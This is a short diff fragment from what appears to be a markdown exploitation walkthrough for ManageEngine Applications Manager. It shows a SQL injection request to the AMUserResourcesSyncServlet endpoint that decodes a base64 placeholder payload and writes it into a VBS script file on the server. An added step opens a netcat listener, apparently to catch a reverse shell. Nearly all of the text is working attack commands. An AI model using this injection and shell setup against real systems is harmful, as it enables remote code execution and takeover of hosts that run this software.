@@ -43,4 +43,7 @@ Match and replace roles in Notepad++ (to make the payload oneliner):
     ```
       /servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1;copy (select convert_from(decode($$ENCODED_PAYLOAD_HERE$$,$$base64$$),$$utf-8$$)) to $$C:\\Program Files (x86)\\ManageEngine\\AppManager12\\working\\conf\\\\application\\scripts\\wmiget.vbs$$;
     ```
-  - 
+5. **Open a Netcat listener**
+```
+nc -nlvp 1337
+```
